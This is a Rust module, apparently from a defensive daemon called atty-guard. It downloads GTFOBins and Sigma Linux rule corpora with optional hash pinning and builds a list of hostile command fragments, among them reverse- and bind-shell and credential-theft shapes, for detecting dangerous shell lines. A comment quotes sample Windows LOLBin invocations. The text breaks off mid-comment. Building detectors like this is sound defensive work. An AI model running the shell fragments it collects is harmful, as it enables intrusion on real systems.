// Type definitions (FetcherConfig, FetchError, …) live at the top of
// the module and are referenced by both the feature-on impl below
// AND the no-feature stub. With `--features atoms-fetch` they're
// fully alive; without the feature the daemon still compiles them
// for API stability but never constructs them — silence the
// dead-code lint for that build only.
#![cfg_attr(not(feature = "atoms-fetch"), allow(dead_code, unused_imports))]

//! V2-I daemon-internal atom fetcher.
//!
//! Pulls IOC corpora from configurable upstream sources, parses
//! them into atom strings, and writes the merged set to
//! `atoms.system.txt` in the daemon's state directory. The
//! daemon's TrustStore loads that file at startup + after each
//! refresh — see `trust_store::reload_system_fetched`.
//!
//! Two operating modes:
//!
//!   - **One-shot CLI**: `atty-guard --update-atoms-now
//!     [--atoms-sources <csv>]`. Fetches the configured sources
//!     synchronously, writes the merged atom set, exits without
//!     binding the UDS socket.
//!
//!   - **Cron**: `atty-guard --atoms-update-interval 6h` runs the
//!     daemon AND spawns a background thread that re-runs the
//!     fetch every interval. Failed fetches log + continue; the
//!     last good `atoms.system.txt` stays in place. After each
//!     successful fetch the spawn thread calls
//!     `trust_store.reload_system_fetched()` so the daemon's
//!     in-memory copy hot-reloads without a restart.
//!
//! Output location: `$STATE_DIRECTORY/atoms.system.txt` (set by
//! the systemd unit's `StateDirectory=atty-guard` directive to
//! `/var/lib/atty-guard/`, atty:atty owned 0750). The
//! TrustStore enforces a permission gate at load time: owner must
//! be the daemon's own UID, mode must not be group/world-writable.
//!
//! Source registry:
//!
//!   - **GTFOBins** — handcurated Linux LOLBAS corpus. ~50 binaries
//!     each with a YAML-fronted markdown manifest. We grab the
//!     repo tarball, walk `_gtfobins/<name>`, extract the
//!     `functions.shell` / `functions.bind-shell` / etc. command
//!     fragments. Small (~150 atoms), high signal.
//!   - **Sigma (Linux subset)** — SigmaHQ rule corpus. Walks
//!     `rules/linux/**/*.yml` and extracts `CommandLine|contains`
//!     substrings from every selector block. Several hundred
//!     atoms covering credential theft / privesc / lateral
//!     movement / persistence shapes.
//!
//! LOLBAS (Living-Off-the-Land Binaries) was a third source in
//! earlier revisions. It was dropped because its corpus is Windows-
//! native by definition — the project's whole reason for existing
//! is curating Microsoft-side LOLBins. Empirically ~423 atoms were
//! pulled from `yml/OS{Binaries,Scripts,Libraries}/`, and roughly
//! all of them were Windows shapes (`rundll32.exe shell32.dll,
//! Control_RunDLL {PATH_ABSOLUTE:.dll}`, `Pester.bat ;{PATH:.exe}`,
//! `wlrmdr.exe -s 3600 -f 0 -t _ -m _ ...`). None ever fire on a
//! Linux shell line, and the documented "wine + ssh-pivot via
//! Windows tools" rationale didn't survive contact with the real
//! atoms. If future Windows/WSL2 support lands, recover the
//! original fetcher + parser + tests with `git log --all -- .` on
//! this file to find the removal commit and cherry-pick from before
//! it.
//!
//! Feature-gated behind `atoms-fetch` so default builds don't
//! pull `flate2` + `tar` + `serde_yaml`.

use std::path::{Path, PathBuf};
use std::time::Duration;

/// Source ID for CLI selection + telemetry. New sources land
/// as additional variants here; the dispatch in `fetch_one` adds
/// a match arm with the source-specific parser.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SourceId {
    Gtfobins,
    /// SigmaHQ Linux rule corpus — extracts `CommandLine|contains`
    /// substrings from `rules/linux/**.yml`. Several hundred atoms
    /// covering credential theft, privilege escalation, lateral
    /// movement, persistence shapes. Placeholder atoms (Sigma rule
    /// authoring convention like `/path/to/output-file` or
    /// `{PATH:.exe}`) get filtered at extract time — see
    /// `is_placeholder_atom`.
    Sigma,
}

impl SourceId {
    pub fn parse(s: &str) -> Option<Self> {
        match s {
            "gtfobins" => Some(SourceId::Gtfobins),
            "sigma" => Some(SourceId::Sigma),
            _ => None,
        }
    }

    pub fn name(&self) -> &'static str {
        match self {
            SourceId::Gtfobins => "gtfobins",
            SourceId::Sigma => "sigma",
        }
    }

    /// All sources enabled by default. Used by the no-arg
    /// `atty-guard --update-atoms-now` form.
    pub fn default_enabled() -> &'static [SourceId] {
        &[SourceId::Gtfobins, SourceId::Sigma]
    }
}

/// Configuration knobs for the fetcher. Held by the daemon's
/// shared state; the cron thread reads it on each tick.
#[derive(Debug, Clone)]
pub struct FetcherConfig {
    /// Where the fetched atom set lands. Defaults to
    /// `$STATE_DIRECTORY/atoms.system.txt` (systemd-managed) or
    /// `/var/lib/atty-guard/atoms.system.txt` for non-systemd runs.
    pub output_path: PathBuf,
    /// Per-source HTTP timeout — tarballs are typically ~1-2 MB
    /// each, so a 30 s budget is comfortable on slow connections
    /// but bails fast on a wedged endpoint.
    pub timeout: Duration,
    /// User-agent string sent with every request. Identifies
    /// atty-guard cleanly in upstream logs (GTFOBins / SigmaHQ
    /// have requested polite UA strings in their READMEs).
    pub user_agent: String,
    /// Operator-set commit pins loaded from
    /// `/etc/atty-guard/atoms.pins.toml`. `None` = live tracking
    /// of `refs/heads/master` (the default). `Some(pins)` means
    /// each present source uses its pinned commit URL and the
    /// fetcher verifies the downloaded tarball's SHA-256 before
    /// parsing. A missing per-source pin under a present file
    /// falls back to live tracking for that source.
    pub pins: Option<AtomPins>,
}

impl Default for FetcherConfig {
    fn default() -> Self {
        Self {
            output_path: default_atoms_path(),
            timeout: Duration::from_secs(30),
            user_agent: format!(
                "atty-guard/{} (+https://github.com/fentas/atty)",
                env!("CARGO_PKG_VERSION")
            ),
            pins: None,
        }
    }
}

impl FetcherConfig {
    /// Constructor that loads operator pin overrides from
    /// `DEFAULT_PIN_FILE` (`/etc/atty-guard/atoms.pins.toml`). Use
    /// this from daemon startup paths. Absent file = `pins: None`
    /// (live tracking, the default). Malformed file is a HARD
    /// error: the operator wants pinning but typed something
    /// wrong; silently falling back to live tracking would defeat
    /// the whole point of opting in.
    ///
    /// The no-`atoms-fetch`-feature build keeps the symbol alive
    /// (returns default with `pins: None`) so call sites in main.rs
    /// can stay un-gated — the daemon's atom-fetch paths are
    /// already feature-gated upstream, so a default-build operator
    /// who passes `--update-atoms-now` hits the FeatureNotBuilt
    /// arm in `fetch_all`, not a missing-symbol link error here.
    pub fn default_with_pins() -> Result<Self, FetchError> {
        Self::default_with_pins_from(Path::new(DEFAULT_PIN_FILE))
    }

    /// Test seam — same as `default_with_pins` but with an
    /// explicit path so unit tests can point at a temp file.
    #[cfg(feature = "atoms-fetch")]
    pub fn default_with_pins_from(path: &Path) -> Result<Self, FetchError> {
        let pins = load_pins(path)?;
        Ok(Self {
            pins,
            ..Self::default()
        })
    }

    #[cfg(not(feature = "atoms-fetch"))]
    pub fn default_with_pins_from(_path: &Path) -> Result<Self, FetchError> {
        Ok(Self::default())
    }
}

/// Operator-set commit pins. Loaded from a TOML file with shape:
///
/// ```toml
/// [gtfobins]
/// commit = "7382261ef936e35896ba70e7a6b833352ffb9a22"
/// sha256 = "3121cb8f46b90ba663dbd9b7b4177cacba32589fc55221ac0874dccbfc3ffaca"
///
/// [sigma]
/// commit = "994da16651194500b607a3007186c29779e1f961"
/// sha256 = "cfbf8b6adae659af15dc147e6d8497c10d48e87dafd584efcfd729f7f9f8d505"
/// ```
///
/// Off-by-default. Operators copy `atoms.pins.toml.example` and
/// edit. Removed/missing keys revert that source to live tracking.
///
/// `deny_unknown_fields`: a typo'd section header (`[gtfobin]`
/// instead of `[gtfobins]`) would otherwise parse silently into
/// `AtomPins{None, None}` — operator opted in, got opt-out
/// behaviour, no warning. Hard error matches the stated posture
/// for the rest of pin-file parsing.
#[derive(Debug, Clone, Default, serde::Deserialize)]
#[serde(deny_unknown_fields)]
pub struct AtomPins {
    pub gtfobins: Option<PinEntry>,
    pub sigma: Option<PinEntry>,
}

/// Per-source pin. `commit` is the git SHA the operator has
/// reviewed; `sha256` is the SHA-256 of the codeload tarball at
/// that commit. Both are validated case-insensitively as hex.
///
/// `deny_unknown_fields`: typo'd key (`comit = "..."`) would
/// otherwise drop the operator's pin silently.
#[derive(Debug, Clone, serde::Deserialize)]
#[serde(deny_unknown_fields)]
pub struct PinEntry {
    pub commit: String,
    pub sha256: String,
}

impl PinEntry {
    /// Codeload URL for `<owner>/<repo>` at this pinned commit.
    pub fn tarball_url(&self, owner_repo: &str) -> String {
        format!(
            "https://codeload.github.com/{owner_repo}/tar.gz/{}",
            self.commit
        )
    }
}

/// Where the daemon looks for the operator pin file.
pub const DEFAULT_PIN_FILE: &str = "/etc/atty-guard/atoms.pins.toml";

/// Load operator pin overrides from `path`. Absent file → Ok(None)
/// (live tracking — the common case). Present file → check perms
/// (root-owned, no group/world-write), parse, validate. Any
/// failure on a present file is a HARD error: the operator opted
/// in, silent fall-back to live tracking would defeat the point.
#[cfg(feature = "atoms-fetch")]
pub fn load_pins(path: &Path) -> Result<Option<AtomPins>, FetchError> {
    load_pins_with_owner(path, 0)
}

/// Test seam — the prod call always passes `expected_uid = 0`
/// (root). Tests run as the user's UID and can't chown a file to
/// root without sudo, so we let them pass their own UID through.
/// The parse + validate logic exercised here is identical; only
/// the owner check changes.
#[cfg(feature = "atoms-fetch")]
pub fn load_pins_with_owner(path: &Path, expected_uid: u32) -> Result<Option<AtomPins>, FetchError> {
    let meta = match std::fs::metadata(path) {
        Ok(m) => m,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(e) => {
            return Err(FetchError::ParseError(format!(
                "stat {}: {}",
                path.display(),
                e
            )))
        }
    };
    if !meta.is_file() {
        return Err(FetchError::ParseError(format!(
            "pin file {} is not a regular file (directory, socket, or fifo \
             at this path is almost certainly a misconfiguration)",
            path.display(),
        )));
    }
    check_pin_file_perms(path, &meta, expected_uid)?;
    let bytes = std::fs::read(path).map_err(|e| {
        FetchError::ParseError(format!("read {}: {}", path.display(), e))
    })?;
    if bytes.iter().all(|b| b.is_ascii_whitespace()) {
        return Err(FetchError::ParseError(format!(
            "pin file {} is empty — remove the file to opt out of pinning, \
             or add at least one [gtfobins] / [sigma] entry",
            path.display(),
        )));
    }
    let text = std::str::from_utf8(&bytes).map_err(|e| {
        FetchError::ParseError(format!("pin file {} not utf-8: {}", path.display(), e))
    })?;
    let pins: AtomPins = toml::from_str(text)
        .map_err(|e| FetchError::ParseError(format!("pin file {} parse: {}", path.display(), e)))?;
    validate_pins(&pins)?;
    if pins.gtfobins.is_none() && pins.sigma.is_none() {
        return Err(FetchError::ParseError(format!(
            "pin file {} has no [gtfobins] or [sigma] entry — remove the file \
             to opt out of pinning, or add at least one entry",
            path.display(),
        )));
    }
    Ok(Some(pins))
}

/// Refuse a pin file that isn't admin-owned-only-writable. Parallel
/// to `trust_store::read_system_atoms_file_checked`'s posture but
/// for the *config* surface: the pin file lives under `/etc/`,
/// must be root-owned (uid 0), and must not be group- or world-
/// writable. A local attacker who finds the file world-writable
/// can swap in a pin pointing at a tarball they control (with a
/// pre-computed SHA). Refusing here matches `atoms.system.txt`.
///
/// Permission gate only — readability bits are intentionally not
/// checked. The daemon needs only `O_RDONLY`; if `/etc/atty-guard/`
/// keeps the file world-readable (the common case) that's fine.
#[cfg(all(feature = "atoms-fetch", unix))]
fn check_pin_file_perms(
    path: &Path,
    meta: &std::fs::Metadata,
    expected_uid: u32,
) -> Result<(), FetchError> {
    use std::os::unix::fs::MetadataExt;
    use std::os::unix::fs::PermissionsExt;
    if meta.uid() != expected_uid {
        return Err(FetchError::ParseError(format!(
            "pin file {} has owner uid {} (expected {}) — `sudo chown root:root {}`",
            path.display(),
            meta.uid(),
            expected_uid,
            path.display(),
        )));
    }
    let mode = meta.permissions().mode() & 0o777;
    if mode & 0o022 != 0 {
        return Err(FetchError::ParseError(format!(
            "pin file {} has mode 0{:o} with group/world write (chmod g-w,o-w {})",
            path.display(),
            mode,
            path.display(),
        )));
    }
    Ok(())
}

#[cfg(all(feature = "atoms-fetch", not(unix)))]
fn check_pin_file_perms(
    _path: &Path,
    _meta: &std::fs::Metadata,
    _expected_uid: u32,
) -> Result<(), FetchError> {
    Ok(())
}

/// Reject obviously-malformed pin entries early. Both fields must
/// be hex (case-insensitive) of the expected length (40 for git SHA-1, 64
/// for SHA-256). We don't bother with SHA-256 git commits yet —
/// when GitHub flips, bump the length check.
#[cfg(feature = "atoms-fetch")]
fn validate_pins(pins: &AtomPins) -> Result<(), FetchError> {
    fn check(label: &str, entry: &PinEntry) -> Result<(), FetchError> {
        if entry.commit.len() != 40 || !entry.commit.bytes().all(|b| b.is_ascii_hexdigit()) {
            return Err(FetchError::ParseError(format!(
                "{label}.commit must be 40 hex chars (sha-1), got {:?}",
                entry.commit
            )));
        }
        if entry.sha256.len() != 64 || !entry.sha256.bytes().all(|b| b.is_ascii_hexdigit()) {
            return Err(FetchError::ParseError(format!(
                "{label}.sha256 must be 64 hex chars (sha-256), got {:?}",
                entry.sha256
            )));
        }
        Ok(())
    }
    if let Some(g) = &pins.gtfobins {
        check("gtfobins", g)?;
    }
    if let Some(s) = &pins.sigma {
        check("sigma", s)?;
    }
    Ok(())
}

/// Resolve where the fetcher writes its output. The daemon's
/// classify hot path reads this file from
/// `<state_root>/atoms.system.txt` (see
/// `TrustStore::reload_system_fetched`), so write order matters:
///
/// 1. `STATE_DIRECTORY/atoms.system.txt` — set by systemd when the
///    unit has `StateDirectory=atty-guard`. This is the canonical
///    post-#140 / post-#150 path: `/var/lib/atty-guard/atoms.system.txt`,
///    atty:atty owned, daemon-writable, daemon-readable.
/// 2. `/var/lib/atty-guard/atoms.system.txt` — non-systemd installs
///    or local dev runs as the atty user.
///
/// XDG_DATA_HOME is NOT used anymore: the daemon (running as atty
/// user with `ProtectHome=yes`) can't see $USER's home, AND the
/// classify hot path doesn't read from there. The old path was
/// a write-only dead-drop and led to the "atom-fetcher writes a
/// file the daemon ignores" bug fixed in #150.
pub fn default_atoms_path() -> PathBuf {
    if let Ok(state_dir) = std::env::var("STATE_DIRECTORY") {
        if let Some(first) = state_dir.split(':').next() {
            if !first.is_empty() {
                return PathBuf::from(first).join("atoms.system.txt");
            }
        }
    }
    PathBuf::from("/var/lib/atty-guard/atoms.system.txt")
}

/// Public alias for the placeholder-atom check used by both
/// atom_fetcher's feature-gated extractor and the trust_store's
/// `atoms add` validator. Lifted out of `mod imp` so it's
/// always available regardless of feature flags — the predicate
/// itself has zero dependencies (pure string ops).
pub fn is_placeholder_atom_public(atom: &str) -> bool {
    // Sigma directory-path placeholder convention.
    if atom.contains("/path/to/") {
        return true;
    }
    // LOLBAS-style `{PATH:.ext}` / `{PATH_ABSOLUTE:.ext}` templates.
    if atom.contains("{PATH:") || atom.contains("{PATH_ABSOLUTE:") {
        return true;
    }
    // Angle-bracket placeholders — `<hostname>`, `<user>`, `<ip>`.
    if let Some(lt) = atom.find('<') {
        let after_lt = &atom[lt + 1..];
        if let Some(gt_off) = after_lt.find('>') {
            let inner = &after_lt[..gt_off];
            if !inner.is_empty()
                && inner
                    .chars()
                    .all(|c| c.is_alphanumeric() || c == '_' || c == '-')
            {
                return true;
            }
        }
    }
    false
}

#[derive(Debug)]
pub enum FetchError {
    /// Only constructed by the `#[cfg(not(feature = "atoms-fetch"))]`
    /// stub `fetch_all` below — emitted when the daemon was built
    /// without the feature but the operator still passes
    /// `--update-atoms-now`. With the feature ON this variant is
    /// dead code; the `#[allow(dead_code)]` keeps the API surface
    /// uniform across feature combinations so callers don't have
    /// to cfg-gate their match arms.
    #[allow(dead_code)]
    FeatureNotBuilt,
    NetworkError(String),
    DecompressError(String),
    ParseError(String),
    WriteError(String),
    /// Operator-pinned commit SHA + expected SHA-256 of the
    /// tarball didn't match what we downloaded. Could be:
    /// upstream force-pushed the pinned commit (unlikely on
    /// GitHub), the operator's pin in
    /// `/etc/atty-guard/atoms.pins.toml` is for a commit whose
    /// tarball codeload now serves differently (rare — codeload
    /// is byte-stable per commit), or a MITM tampered with the
    /// download (rare with HTTPS+rustls but the digest is the
    /// actual proof). Either way: refuse to use the tarball;
    /// keep the existing atoms.system.txt intact. Resolve by
    /// re-running the pin-bump procedure in
    /// `atoms.pins.toml.example`.
    DigestMismatch {
        url: String,
        expected: String,
        actual: String,
    },
}

impl std::fmt::Display for FetchError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            FetchError::FeatureNotBuilt => write!(
                f,
                "atoms-fetch feature not built — rebuild with `cargo build --features atoms-fetch`"
            ),
            FetchError::NetworkError(s) => write!(f, "network error: {s}"),
            FetchError::DecompressError(s) => write!(f, "decompress error: {s}"),
            FetchError::ParseError(s) => write!(f, "parse error: {s}"),
            FetchError::WriteError(s) => write!(f, "write error: {s}"),
            FetchError::DigestMismatch {
                url,
                expected,
                actual,
            } => write!(
                f,
                "digest mismatch for {url}: expected sha256={expected}, got sha256={actual} — refusing to overwrite atoms.system.txt; check the pinned commit + sha256 in /etc/atty-guard/atoms.pins.toml (bump per the refresh procedure in atoms.pins.toml.example if the pin is intentionally behind)"
            ),
        }
    }
}

impl std::error::Error for FetchError {}

/// Summary of one fetch pass — what was tried, what landed, how
/// many atoms surfaced per source. Returned from `fetch_all` so
/// the daemon's log can show a one-line "refreshed N atoms from
/// M sources" message.
#[derive(Debug, Clone, Default)]
pub struct FetchReport {
    pub atoms_total: usize,
    pub per_source: Vec<(SourceId, Result<usize, String>)>,
}

// ===========================================================================
// Feature-OFF stub.

#[cfg(not(feature = "atoms-fetch"))]
pub fn fetch_all(_cfg: &FetcherConfig, _sources: &[SourceId]) -> Result<FetchReport, FetchError> {
    Err(FetchError::FeatureNotBuilt)
}

#[cfg(not(feature = "atoms-fetch"))]
pub fn spawn_periodic_refresh(
    _cfg: FetcherConfig,
    _sources: Vec<SourceId>,
    _interval: Duration,
    _trust_store: std::sync::Arc<crate::trust_store::TrustStore>,
) {
    // No-op in builds without the feature. main.rs logs the
    // FeatureNotBuilt and continues with the bundled atoms.
}

// ===========================================================================
// Feature-ON impl.

#[cfg(feature = "atoms-fetch")]
mod imp {
    use super::*;
    use sha2::{Digest, Sha256};
    use std::collections::BTreeSet;
    use std::io::Read;

    /// Defense-in-depth cap on the merged-corpus size after parsing.
    /// Sigma + GTFOBins together produce ~600-800 atoms today; 10k
    /// is ~12x headroom for upstream growth without being so loose
    /// that a parser bug (or compromised upstream that slips a huge
    /// junk corpus through both the SHA pin AND our parsers — yes,
    /// it's belt+braces) can balloon the in-memory AtomMatcher.
    /// Hit means we refuse to write and keep the last-good file.
    pub(super) const MAX_ATOMS_TOTAL: usize = 10_000;

    /// Defense-in-depth atom cap. Refuse to overwrite
    /// `atoms.system.txt` if the parsed corpus exceeds the cap —
    /// a parser bug or compromised upstream that somehow slipped
    /// a wildly inflated corpus past every other gate keeps the
    /// last-good file in place. Lifted into its own function so
    /// the behavioral test can hit the error path without going
    /// through fetch_all's network step.
    pub(super) fn enforce_atom_count_cap(count: usize) -> Result<(), FetchError> {
        if count > MAX_ATOMS_TOTAL {
            return Err(FetchError::ParseError(format!(
                "atom count {} exceeds cap {} — refusing to overwrite atoms.system.txt",
                count, MAX_ATOMS_TOTAL,
            )));
        }
        Ok(())
    }

    /// Defense-in-depth tarball size check. Same posture as
    /// `enforce_atom_count_cap` — extracted so a test can hit the
    /// reject path without spinning up a fake codeload.
    pub(super) fn enforce_tarball_size_cap(
        url: &str,
        len: usize,
    ) -> Result<(), FetchError> {
        if len > MAX_TARBALL_BYTES {
            return Err(FetchError::NetworkError(format!(
                "tarball from {url} ({len} bytes) exceeds {} MiB cap — refusing to parse",
                MAX_TARBALL_BYTES / (1024 * 1024)
            )));
        }
        Ok(())
    }

    /// Hard ceiling on raw tarball bytes pulled from upstream. Sigma
    /// is ~15 MB and GTFOBins is < 2 MB as of 2026-05; 32 MiB is
    /// ~2x headroom for organic growth without giving a compromised
    /// upstream room to ship a multi-GB blob that exhausts our
    /// memory or the daemon's StateDirectory quota. Hit means we
    /// reject the source and keep the last-good atoms.system.txt.
    pub(super) const MAX_TARBALL_BYTES: usize = 32 * 1024 * 1024;

    /// Top-level entry point. Walks each requested source, merges
    /// the per-source atom sets into one deduped `BTreeSet` (stable
    /// order in the output file), and atomically writes
    /// `atoms.system.txt` via tmp+rename.
    ///
    /// Each source failure is captured in `FetchReport.per_source`
    /// — one bad source doesn't fail the whole refresh. If EVERY
    /// source fails (or all yield zero atoms), we DON'T overwrite
    /// the last-good `atoms.system.txt` — the existing corpus
    /// stays in place and we return an error. This matches the
    /// "last good atom set stays in place" guarantee in the module
    /// docs.
    pub fn fetch_all(cfg: &FetcherConfig, sources: &[SourceId]) -> Result<FetchReport, FetchError> {
        let mut all_atoms: BTreeSet<String> = BTreeSet::new();
        let mut report = FetchReport::default();
        let mut any_success = false;

        for sid in sources {
            match fetch_one(cfg, *sid) {
                Ok(atoms) => {
                    let n = atoms.len();
                    if n > 0 {
                        any_success = true;
                    }
                    all_atoms.extend(atoms);
                    report.per_source.push((*sid, Ok(n)));
                }
                Err(e) => {
                    report.per_source.push((*sid, Err(e.to_string())));
                }
            }
        }

        report.atoms_total = all_atoms.len();
        if !any_success {
            return Err(FetchError::ParseError(
                "all sources failed or produced zero atoms — keeping previous atoms.system.txt"
                    .to_owned(),
            ));
        }
        enforce_atom_count_cap(all_atoms.len())?;
        write_atoms(&cfg.output_path, &all_atoms)?;
        Ok(report)
    }

    fn fetch_one(cfg: &FetcherConfig, source: SourceId) -> Result<Vec<String>, FetchError> {
        match source {
            SourceId::Gtfobins => fetch_gtfobins(cfg),
            SourceId::Sigma => fetch_sigma(cfg),
        }
    }

    /// Walk GTFOBins's repo tarball, extract every `_gtfobins/<bin>`
    /// file's YAML front-matter, pull command fragments out of the
    /// `functions.shell` / `bind-shell` / `reverse-shell` / etc.
    /// blocks. Each fragment is normalised + truncated to the
    /// first line (atoms are single-line by definition).
    ///
    /// GTFOBins's entries are **extensionless** in the live repo
    /// (e.g. `_gtfobins/nc`, `_gtfobins/bash`, `_gtfobins/perl`)
    /// — DON'T filter on `.md`. The path-shape signal we use is
    /// `_gtfobins/<name>` with no further path components, which
    /// excludes the directory entry itself + any nested dirs.
    fn fetch_gtfobins(cfg: &FetcherConfig) -> Result<Vec<String>, FetchError> {
        let pin = cfg.pins.as_ref().and_then(|p| p.gtfobins.as_ref());
        let url = pin
            .map(|p| p.tarball_url("GTFOBins/GTFOBins.github.io"))
            .unwrap_or_else(|| {
                "https://codeload.github.com/GTFOBins/GTFOBins.github.io/tar.gz/refs/heads/master"
                    .to_owned()
            });
        let buf = download_tarball(cfg, &url, pin.map(|p| p.sha256.as_str()))?;
        walk_tarball_atoms(&buf, is_gtfobins_entry_file, extract_gtfobins_atoms)
    }

    fn fetch_sigma(cfg: &FetcherConfig) -> Result<Vec<String>, FetchError> {
        // SigmaHQ Linux rule corpus. `rules/linux/**.yml` files
        // carry `detection.<selector>.CommandLine|contains` lists
        // — substrings the rule author wants to match in shell
        // process-creation events. Those substrings ARE atoms.
        let pin = cfg.pins.as_ref().and_then(|p| p.sigma.as_ref());
        let url = pin
            .map(|p| p.tarball_url("SigmaHQ/sigma"))
            .unwrap_or_else(|| {
                "https://codeload.github.com/SigmaHQ/sigma/tar.gz/refs/heads/master".to_owned()
            });
        let buf = download_tarball(cfg, &url, pin.map(|p| p.sha256.as_str()))?;
        walk_tarball_atoms(&buf, is_sigma_linux_rule, extract_sigma_atoms)
    }

    /// Download a source tarball. The size cap fires regardless of
    /// pinning — it's transport-level defense in depth. The digest
    /// check fires only when an operator pin is in effect; without
    /// a pin the daemon trusts HTTPS + the post-parse caps to bound
    /// blast radius.
    fn download_tarball(
        cfg: &FetcherConfig,
        url: &str,
        expected_sha256: Option<&str>,
    ) -> Result<Vec<u8>, FetchError> {
        let agent = ureq::AgentBuilder::new()
            .timeout(cfg.timeout)
            .user_agent(&cfg.user_agent)
            .build();
        let resp = agent
            .get(url)
            .call()
            .map_err(|e| FetchError::NetworkError(e.to_string()))?;
        // Sigma's tarball is ~15 MB; GTFOBins is < 2 MB. Cap at
        // MAX_TARBALL_BYTES so a hostile or runaway upstream can't
        // exhaust memory. We request MAX+1 bytes so that "saw
        // exactly cap many bytes" is unambiguous from "saw cap
        // bytes and there were more" — buf.len() > MAX iff the
        // upstream was over the limit, buf.len() <= MAX means we
        // got the whole tarball.
        let mut buf = Vec::with_capacity(4 * 1024 * 1024);
        let limit = MAX_TARBALL_BYTES as u64 + 1;
        resp.into_reader()
            .take(limit)
            .read_to_end(&mut buf)
            .map_err(|e| FetchError::NetworkError(e.to_string()))?;
        enforce_tarball_size_cap(url, buf.len())?;
        if let Some(expected) = expected_sha256 {
            verify_digest(url, &buf, expected)?;
        }
        Ok(buf)
    }

    /// Verify the downloaded tarball matches the operator-pinned
    /// SHA-256. Pure function over (url, bytes, expected_hex) so it
    /// can be tested without network. Digest mismatch never reaches
    /// `walk_tarball_atoms`, which means `fetch_all`'s `any_success`
    /// flag never flips for a tampered source and the existing
    /// atoms.system.txt stays untouched.
    pub(super) fn verify_digest(
        url: &str,
        bytes: &[u8],
        expected_hex: &str,
    ) -> Result<(), FetchError> {
        let actual = Sha256::digest(bytes);
        let actual_hex = hex_encode(&actual);
        if actual_hex.eq_ignore_ascii_case(expected_hex) {
            Ok(())
        } else {
            Err(FetchError::DigestMismatch {
                url: url.to_owned(),
                expected: expected_hex.to_owned(),
                actual: actual_hex,
            })
        }
    }

    fn hex_encode(bytes: &[u8]) -> String {
        const HEX: &[u8; 16] = b"0123456789abcdef";
        let mut out = String::with_capacity(bytes.len() * 2);
        for b in bytes {
            out.push(HEX[(b >> 4) as usize] as char);
            out.push(HEX[(b & 0x0f) as usize] as char);
        }
        out
    }

    /// Generic tarball walker: filter entries by `pred`, parse each
    /// matching file via `extract`. Decompresses gz once, streams
    /// entries. Same shape every source needs. Predicates take
    /// `&Path + EntryType` so they don't depend on the tar reader's
    /// generic type parameter.
    fn walk_tarball_atoms(
        gz_bytes: &[u8],
        pred: fn(&std::path::Path, tar::EntryType) -> bool,
        extract: fn(&str, &mut BTreeSet<String>),
    ) -> Result<Vec<String>, FetchError> {
        let gz = flate2::read::GzDecoder::new(gz_bytes);
        let mut ar = tar::Archive::new(gz);
        let mut atoms: BTreeSet<String> = BTreeSet::new();

        for entry in ar
            .entries()
            .map_err(|e| FetchError::DecompressError(e.to_string()))?
        {
            let mut entry = entry.map_err(|e| FetchError::DecompressError(e.to_string()))?;
            let path = match entry.path() {
                Ok(p) => p.into_owned(),
                Err(_) => continue,
            };
            let etype = entry.header().entry_type();
            if !pred(&path, etype) {
                continue;
            }
            let mut content = String::new();
            if entry.read_to_string(&mut content).is_err() {
                continue;
            }
            extract(&content, &mut atoms);
        }
        Ok(atoms.into_iter().collect())
    }

    /// Returns true when the tarball entry is one of GTFOBins's
    /// per-binary manifest files. Real layout:
    /// `GTFOBins.github.io-master/_gtfobins/<binary>` — no
    /// extension, no nested directories under `_gtfobins/`.
    ///
    /// Filtering on path shape (rather than file extension) is
    /// load-bearing: the original `.md` filter rejected every
    /// real GTFOBins entry, so the fetcher silently wrote zero
    /// atoms while unit tests bypassing the path filter passed.
    fn is_gtfobins_entry_file(path: &std::path::Path, etype: tar::EntryType) -> bool {
        if !etype.is_file() {
            return false;
        }
        let Some(parent) = path.parent() else {
            return false;
        };
        // Need: parent ends with `_gtfobins`. Reject the rare entry
        // that nests further (e.g. `_gtfobins/subdir/foo`).
        parent
            .file_name()
            .map(|n| n == std::ffi::OsStr::new("_gtfobins"))
            .unwrap_or(false)
    }

    /// Layout: `sigma-master/rules/linux/<category>/<rule>.yml`.
    /// Other top-level `rules/` directories (windows / macos /
    /// network / etc.) are skipped — Linux corpus only.
    fn is_sigma_linux_rule(path: &std::path::Path, etype: tar::EntryType) -> bool {
        if !etype.is_file() {
            return false;
        }
        let path_str = path.to_string_lossy();
        path_str.contains("/rules/linux/") && path_str.ends_with(".yml")
    }

    /// Parse one GTFOBins markdown file's YAML front-matter and
    /// pull command fragments. The file shape is:
    /// ```text
    /// ---
    /// functions:
    ///   shell:
    ///     - code: |
    ///         <command>
    /// ---
    /// ```
    /// We extract every `code` scalar, take its first line, trim.
    /// Atom rules (≥3 chars, no leading `#`) apply at write time.
    fn extract_gtfobins_atoms(content: &str, atoms: &mut BTreeSet<String>) {
        // Front-matter starts with `---\n`. Upstream GTFOBins files
        // (verified 2026-05-19 on GTFOBins/GTFOBins.github.io@master)
        // are PURE YAML wrapped in a leading `---\n` — there's no
        // closing fence, and the rest of the file is the structured
        // YAML body Jekyll renders. The earlier "require closing
        // fence" check produced 0 atoms across the entire corpus
        // because the close marker never existed. Now: strip the
        // leading fence, treat the rest as YAML. If a closing
        // `\n---\n` IS present (e.g. a future file with trailing
        // prose), truncate at it.
        let stripped = content
            .strip_prefix("---\n")
            .or_else(|| content.strip_prefix("---\r\n"));
        let Some(rest) = stripped else { return };
        let yaml = if let Some(at) = rest.find("\n---\n") {
            &rest[..at]
        } else if let Some(at) = rest.find("\n---\r\n") {
            &rest[..at]
        } else {
            rest
        };
        let parsed: serde_yaml::Value = match serde_yaml::from_str(yaml) {
            Ok(v) => v,
            Err(_) => return,
        };
        let funcs = match parsed.get("functions").and_then(|f| f.as_mapping()) {
            Some(m) => m,
            None => return,
        };
        for (_func_name, func_val) in funcs {
            let arr = match func_val.as_sequence() {
                Some(a) => a,
                None => continue,
            };
            for entry in arr {
                let code = match entry.get("code").and_then(|c| c.as_str()) {
                    Some(s) => s,
                    None => continue,
                };
                if let Some(atom) = atom_from_code(code) {
                    atoms.insert(atom);
                }
            }
        }
    }

    /// Parse one Sigma rule YAML. Sigma's `detection.<selector>`
    /// is a mapping whose keys may carry modifier suffixes
    /// (`CommandLine|contains`, `Image|endswith`, etc.). The
    /// `|contains` variant is the most atom-shaped — substring
    /// patterns the rule author wants to match in process events.
    /// We harvest the values from those keys; everything else
    /// (regex via `|re`, exact-match keys, the `condition` field)
    /// is skipped.
